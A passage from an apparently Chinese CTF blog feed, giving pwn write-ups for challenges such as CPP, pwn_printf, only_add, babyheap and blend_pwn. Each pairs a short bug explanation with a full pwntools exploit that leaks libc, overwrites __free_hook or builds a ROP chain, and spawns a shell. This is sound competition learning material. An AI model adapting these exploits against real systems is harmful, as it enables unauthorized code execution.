free')</span></span><br><span class="line">p.sendline(str(system)[<span class="number">1</span>:<span class="number">-2</span>])</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="CPP"><a href="#CPP" class="headerlink" title="CPP"></a>CPP</h3><p>c++的题目，静态分析有点困难，所以直接gdb看堆块变化。</p><p>分析发现free后未对堆指针置0，因而存在uaf漏洞。另外edit的时候会重新申请相应大小堆块。</p><p>首先double free掉0x20的堆块，并将fd修改为下面unsortbin堆块-0x10偏移处地址，方便后面进行io leak。</p><p>接着申请0x88大小的堆块，并先申请0x48大小的堆块，double free（修复后续申请堆块问题）。</p><p>接着申请0x98，防止unsortbin被合并到topchunk。</p><p>申请回0x88的堆块，将其free填满tcache即放入unsortbin，获得libc相应偏移的地址。</p><p>接着用上面0x20的堆块修改0x88堆块的fd，将其爆破到<code>_IO_2_1_stdout_-0x61</code>处，并将size修改为0x21，并修复bins结构。</p><p>接着构造payload进行ioleak，注意长度需要满足，这里用了<code>&#39;\xff&#39;*7+p64(0)*12+p64(0xfbad1800)+p64(0)*3+&#39;\x00&#39;</code>。这样即可leak出libc地址。</p><p>接着double free，劫持<code>__free_hook</code>为system函数地址，再用edit输入shell命令：<code>&quot;/bin/sh&quot;.ljust(0x1f,&#39;\x00&#39;)+&#39;icqb8a2d9242a67b4510eacfe4635155&#39;</code>，操作中即会将该堆块free并输入token。（关于截取长度的问题，这里爆破了很久，最终确定是0x1f大小后接token就可以）。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.timeout=<span class="number">1</span></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">p = process(<span class="string">"./cpp"</span>,env = &#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc-2.27.so"</span>&#125;)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.27.so"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"[B]ye"</span>)</span><br><span class="line">p.sendline(<span class="string">"C"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"[B]ye"</span>)</span><br><span class="line">p.sendline(<span class="string">"W"</span>)</span><br><span class="line">p.sendline(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"[B]ye"</span>)</span><br><span class="line">p.sendline(<span class="string">"D"</span>)</span><br><span class="line">libc.address = <span class="number">0x00007ffff79e2000</span></span><br><span class="line"><span class="keyword">print</span> hex(libc.sym[<span class="string">'_IO_2_1_stdout_'</span>])</span><br><span class="line">add()</span><br><span class="line">add()</span><br><span class="line">edit(<span class="string">'1'</span>*<span class="number">0x20</span>)</span><br><span class="line">add()</span><br><span class="line">edit(<span class="string">'1'</span>*<span class="number">0x18</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">free()</span><br><span class="line">edit(<span class="string">'\x90\xd1'</span>)</span><br><span class="line">edit(<span class="string">'1'</span>*<span class="number">0x88</span>)</span><br><span class="line">edit(<span class="string">'1'</span>*<span class="number">0x48</span>)</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line">edit(<span class="string">'1'</span>*<span class="number">0x98</span>)</span><br><span class="line">edit(<span class="string">'1'</span>*<span class="number">0x88</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">free()</span><br><span class="line">add()</span><br><span class="line">edit(p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+<span class="string">'\xf9\xe6'</span>)</span><br><span class="line">edit(<span class="string">'\xff'</span>*<span class="number">7</span>+p64(<span class="number">0</span>)*<span class="number">12</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x00'</span>)</span><br><span class="line">p.recvuntil(p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">8</span>))<span class="number">-0x3EC700</span></span><br><span class="line"><span class="keyword">print</span> hex(libc.address)</span><br><span class="line">free()</span><br><span class="line">edit(p64(libc.sym[<span class="string">'__free_hook'</span>]))</span><br><span class="line">edit(p64(libc.sym[<span class="string">'__free_hook'</span>]))</span><br><span class="line">edit(p64(libc.sym[<span class="string">'system'</span>]))</span><br><span class="line"><span class="comment">#gdb.attach(p,'b malloc\n b free')</span></span><br><span class="line">edit(<span class="string">"/bin/sh"</span>.ljust(<span class="number">0x1f</span>,<span class="string">'\x00'</span>)+<span class="string">'icqb8a2d9242a67b4510eacfe4635155'</span>)</span><br><span class="line">p.interactive()</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">i += <span class="number">1</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">print</span> i</span><br><span class="line">exp()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"fail"</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;ParseC&quot;&gt;&lt;a href=&quot;#ParseC&quot; class=&quot;headerlink&quot; title=&quot;ParseC&quot;&gt;&lt;/a&gt;ParseC&lt;/h3&gt;&lt;p&gt;JIT类型题目。&lt;/p&gt;
&lt;p&gt;有三个函数：read(读取浮点数)、puts（输出字符）、print（输出浮
      
    
    </summary>
    
    
      <category term="WP" scheme="https://nuoye-blog.github.io/categories/WP/"/>
    
    
      <category term="ctf" scheme="https://nuoye-blog.github.io/tags/ctf/"/>
    
      <category term="WP" scheme="https://nuoye-blog.github.io/tags/WP/"/>
    
      <category term="PWN" scheme="https://nuoye-blog.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>2020湖湘杯pwn-WP</title>
    <link href="https://nuoye-blog.github.io/2020/11/03/c0045b88/"/>
    <id>https://nuoye-blog.github.io/2020/11/03/c0045b88/</id>
    <published>2020-11-03T09:00:00.000Z</published>
    <updated>2020-11-03T09:17:08.742Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="pwn-printf"><a href="#pwn-printf" class="headerlink" title="pwn_printf"></a>pwn_printf</h3><p>首先输入0x10个size(0x20)，即可实现栈溢出。然后就是简单的rop和getshell，脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./pwn_printf"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./pwn_printf"</span>).libc</span><br><span class="line">p.recvuntil(<span class="string">"You will find this game very interesting\n"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x4007DF')</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">p.sendline(str(<span class="number">0x20</span>))</span><br><span class="line">puts_plt = <span class="number">0x400640</span></span><br><span class="line">puts_got = <span class="number">0x603018</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000401213</span></span><br><span class="line">p.send(p64(<span class="number">0x603500</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(<span class="number">0x4007DF</span>))</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>) - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"><span class="comment">#p.send("a"*0x8+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(0x4007C6))</span></span><br><span class="line">p.sendline(<span class="string">"a"</span>*<span class="number">0x8</span>+p64(pop_rdi)+p64(libc_base+libc.search(<span class="string">"/bin/sh"</span>).next())+p64(libc_base+libc.sym[<span class="string">'system'</span>]))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="only-add"><a href="#only-add" class="headerlink" title="only_add"></a>only_add</h3><p>只有add功能，但是用的是realloc函数，size为0时即为free。</p><p>另外输入的时候可以off by one，修改size位可在下次申请到的时候溢出该堆块。</p><p>首先构造出unsortbin，并且利用off by one漏洞溢出修改其fd为<code>_IO_2_1_stdout_</code>，然后继续改另一tcache堆块fd到这里。</p><p>注意这里可以用realloc将堆块分割避免放入原来的tcache中，利用该方法进行io_leak，得到libc地址。</p><p>接着用close(1)处的逻辑将堆块指针置0，然后再次进行realloc，劫持某一tcache的fd到<code>__free_hook</code>，并修改其为system即可getshell。</p><p>getshell后需要用<code>sh &gt;&amp;2</code>恢复回显。整个脚本的概率是1/256：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.timeout = <span class="number">1</span></span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">p = process(<span class="string">"./pwn"</span>,env =&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc.so.6"</span>&#125;)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"choice:"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Size:"</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">"Data:"</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"choice:"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Size:"</span>)</span><br><span class="line">p.sendline(str(<span class="number">0</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">close_io</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"choice:"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add2</span><span class="params">(size,data)</span>:</span></span><br><span class="line">p.send(<span class="string">"0000000000000001"</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(data)</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free2</span><span class="params">()</span>:</span></span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">'0'</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xb8</span>,<span class="string">'a'</span>)</span><br><span class="line">free()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">add(<span class="number">0x118</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">0x88</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">0x1d8</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">0x88</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">0x1f8</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">'a'</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">0x1b8</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">0x48</span>,<span class="string">'a'</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">0x168</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">'a'</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">0x138</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">0x88</span>,<span class="string">'a'</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">0x48</span>,<span class="string">'\x00'</span>*<span class="number">0x48</span>+<span class="string">'\xc0'</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">'a'</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">0xb8</span>,<span class="string">'\x00'</span>*<span class="number">0x28</span>+p64(<span class="number">0x101</span>)+<span class="string">'\x60\xe7'</span>)</span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">'\x00'</span>*<span class="number">0x38</span>+<span class="string">'\xe0'</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">0x48</span>,<span class="string">'a'</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">0xd8</span>,<span class="string">'\x00'</span>*<span class="number">0x48</span>+p64(<span class="number">0x51</span>)+<span class="string">'\x20\x79'</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">0xb8</span>,<span class="string">'a'</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">0xb8</span>,<span class="string">'a'</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">0xb8</span>,p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x00'</span>)</span><br><span class="line">p.recvuntil(p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x3EC700</span></span><br><span class="line"><span class="keyword">print</span> hex(libc.address)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (libc.address&amp;<span class="number">0xfff</span>==<span class="number">0</span>):</span><br><span class="line">close_io()</span><br><span class="line">add2(<span class="number">0x48</span>,<span class="string">'\x00'</span>*<span class="number">0x28</span>+p64(<span class="number">0x141</span>)+p64(libc.sym[<span class="string">'__free_hook'</span>]<span class="number">-8</span>))<span class="comment">#0x555555757710</span></span><br><span class="line">free2()</span><br><span class="line">add2(<span class="number">0xf8</span>,<span class="string">'a'</span>)</span><br><span class="line">free2()</span><br><span class="line">add2(<span class="number">0xf8</span>,<span class="string">'/bin/sh\x00'</span>+p64(libc.sym[<span class="string">'system'</span>]))</span><br><span class="line"><span class="comment">#gdb.attach(p,'b realloc\n b free')</span></span><br><span class="line">free2()</span><br><span class="line">p.sendline(<span class="string">"sh &gt;&amp;2"</span>)</span><br><span class="line">p.sendline(<span class="string">"cat flag"</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">i += <span class="number">1</span></span><br><span class="line"><span class="keyword">print</span> i</span><br><span class="line">exp()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'fail'</span></span><br></pre></td></tr></table></figure><h3 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h3><p>show和del函数未正确检查index。</p><p>首先用<code>show(-7)</code>leak出pie地址。</p><p>接着填满tcache，leak出libc地址和堆地址。</p><p>然后在堆上伪造出size为0x100的堆块，并用del函数进行free，然后劫持其fd指针修改为<code>__free_hook</code>，并改为system函数地址，执行/bin/sh即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.timeout = 1</span></span><br><span class="line">p = process(<span class="string">"./babyheap"</span>,env =&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc.so.6"</span>&#125;)</span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"index?"</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,size,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"index?"</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(<span class="string">"Size:"</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">"Content:"</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"4"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"index?"</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">show(<span class="number">-7</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">pie = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)<span class="number">-0x202008</span></span><br><span class="line"><span class="keyword">print</span> hex(pie)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">add()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">free(<span class="number">7</span>-i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">add()</span><br><span class="line">edit(<span class="number">7</span>,<span class="number">0x20</span>,<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">p.recvuntil(<span class="string">"a"</span>*<span class="number">8</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)<span class="number">-0x3EBCA0</span></span><br><span class="line"><span class="keyword">print</span> hex(libc.address)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">heap = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)</span><br><span class="line"><span class="keyword">print</span> hex(heap)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x88</span>,p64(heap<span class="number">-0xD0</span>)*<span class="number">5</span>+p64(<span class="number">0x101</span>))</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x88</span>,p64(<span class="number">0</span>)*<span class="number">5</span>+p64(<span class="number">0x101</span>))</span><br><span class="line">free(( heap - <span class="number">0xe0</span> - (pie+<span class="number">0x202040</span>) )/<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x88</span>,p64(heap<span class="number">-0xD0</span>)*<span class="number">5</span>+p64(<span class="number">0x101</span>)+p64(libc.sym[<span class="string">'__free_hook'</span>]))</span><br><span class="line">add()</span><br><span class="line">add()</span><br><span class="line">edit(<span class="number">9</span>,<span class="number">9</span>,p64(libc.sym[<span class="string">'system'</span>]))</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">8</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b free')</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="blend-pwn"><a href="#blend-pwn" class="headerlink" title="blend_pwn"></a>blend_pwn</h3><p>这道是赛后才做出来的，前面是简单的用堆来进行leak操作，后面主要卡在c++的异常化处理上。</p><p>最后看了Lime师傅的脚本才知道最后输入的栈指针后需要跟上一个字符才能过。具体payload如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./blend_pwn"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./blend_pwn"</span>).libc</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Enter your choice &gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"input note:"</span>)</span><br><span class="line">p.sendline(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Enter your choice &gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"index&gt;"</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Enter your choice &gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"4"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_name</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Enter your choice &gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backdoor</span><span class="params">(data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Enter your choice &gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"666"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Please input what you want:"</span>)</span><br><span class="line">p.send(data)</span><br><span class="line">one = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">p.recvuntil(<span class="string">"Please enter a name: "</span>)</span><br><span class="line">p.sendline(<span class="string">"%2$p"</span>)</span><br><span class="line"></span><br><span class="line">show_name()</span><br><span class="line">p.recvuntil(<span class="string">"user:0x"</span>)</span><br><span class="line">libc.address = int(p.recv(<span class="number">12</span>),<span class="number">16</span>)<span class="number">-0x6CF780</span>+<span class="number">0x309000</span></span><br><span class="line"><span class="keyword">print</span> hex(libc.address)</span><br><span class="line">addr = libc.address+<span class="number">0x3C6F38</span></span><br><span class="line">add(p64(<span class="number">0</span>)*<span class="number">3</span>+p64(libc.address+one[<span class="number">0</span>]))</span><br><span class="line"><span class="keyword">print</span> hex(addr)</span><br><span class="line">add(<span class="string">"111"</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">"index 2:"</span>)</span><br><span class="line">heap = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)</span><br><span class="line"><span class="keyword">print</span> hex(heap)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b *$rebase(0x11B8)')</span></span><br><span class="line">backdoor(p64(<span class="number">0</span>)*<span 